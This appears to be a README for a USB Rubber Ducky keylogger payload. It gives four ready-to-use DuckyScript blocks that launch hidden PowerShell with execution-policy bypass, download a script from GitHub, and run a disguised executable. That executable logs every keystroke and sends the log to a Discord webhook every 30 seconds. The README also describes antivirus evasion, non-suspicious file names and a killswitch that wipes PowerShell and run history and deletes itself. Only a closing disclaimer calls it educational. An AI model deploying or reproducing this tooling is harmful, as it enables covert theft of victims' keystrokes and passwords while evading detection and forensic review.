# Keylogger 
Download and execute a keylogger executable to run on the target machine that logs all keystrokes to a text file and sends the file to a Discord webhook every 30 seconds. Optional killswitch. Only compatible on Windows 64-bit targets.

Two versions of the executable have been created, ```usersystem32.exe``` and ```svcusersystem32.exe```.
Whilst developing the ```usersystem32.exe``` executable, Windows Defender eventually picked up on it and it got flagged as a PUP/virus. 

```svcusersystem32.exe``` is the successor which includes some random mathematical functions to try and throw off the detection. If you would like to test them out for yourself, you might need to disable **Real-time protection** in your Windows settings (Windows Security > Virus & threat protection settings > Real-time protection). 

Don't forget to re-enable this setting once you have tested and played around with the keylogger yourself.

The ```service.ps1``` script will manage the download of the keylogger, sending of data to the webhook and the killswitch. If a killswitch is set, the following actions are done:
1. Keylogger executable process is stopped
2. The folder created in the temp directory where the keylogger executable and text file that it writes to is deleted
3. Run history is cleared
4. Terminal output is cleared
5. Powershell history is cleared
6. Recycle bin is emptied
7. Powershell script itself self-deletes

If no killswitch is set, the script will run until the machine is powered off. All files are downloaded in the users ```temp``` directory anyway, so these will be cleared. However, powershell and run history will not be cleared and may be able to reveal instances of the keylogger existing. Including a killswitch will always be more discreet. 

The PowerShell script, keylogger executables and text files that are generated to log the keystrokes have been given non-suspicious names to try and avoid detection. 

---

### Usage 

#### Base Keylogger with killswitch
```
GUI r
DELAY 500 
STRING powershell 
DELAY 500 
ENTER 
DELAY 2000 
STRING powershell -w h -NoP -Ep Bypass Invoke-WebRequest "https://github.com/tpazz/Cute-Little-Duckies/raw/main/keylogger/service.ps1" -OutFile "service.ps1"; .\service.ps1 -webhookUrl "[YOUR DISCORD WEBHOOK]" -killSwitch "2024-06-27T17:28:00" -exe "usersystem32"
DELAY 1000
ENTER
```
#### Advanced Keylogger with killswitch
```
GUI r
DELAY 500 
STRING powershell 
DELAY 500 
ENTER 
DELAY 2000 
STRING powershell -w h -NoP -Ep Bypass Invoke-WebRequest "https://github.com/tpazz/Cute-Little-Duckies/raw/main/keylogger/service.ps1" -OutFile "service.ps1"; .\service.ps1 -webhookUrl "[YOUR DISCORD WEBHOOK]" -killSwitch "2024-06-27T17:28:00" -exe "svcusersystem32"
DELAY 1000
ENTER
```
#### Base Keylogger without killswitch
```
GUI r
DELAY 500 
STRING powershell 
DELAY 500 
ENTER 
DELAY 2000 
STRING powershell -w h -NoP -Ep Bypass Invoke-WebRequest "https://github.com/tpazz/Cute-Little-Duckies/raw/main/keylogger/service.ps1" -OutFile "service.ps1"; .\service.ps1 -webhookUrl "[YOUR DISCORD WEBHOOK]" -exe "usersystem32"
DELAY 1000
ENTER
```
#### Advanced Keylogger without killswitch
```
GUI r
DELAY 500 
STRING powershell 
DELAY 500 
ENTER 
DELAY 2000 
STRING powershell -w h -NoP -Ep Bypass Invoke-WebRequest "https://github.com/tpazz/Cute-Little-Duckies/raw/main/keylogger/service.ps1" -OutFile "service.ps1"; .\service.ps1 -webhookUrl "[YOUR DISCORD WEBHOOK]" -exe "svcusersystem32"
DELAY 1000
ENTER
```

## DISCLAIMER
ALL scripts, programs and files in this repository are intended for educational purposes only. The author is not responsible for any damages, unauthorized access, or illegal activities that may arise from this content.
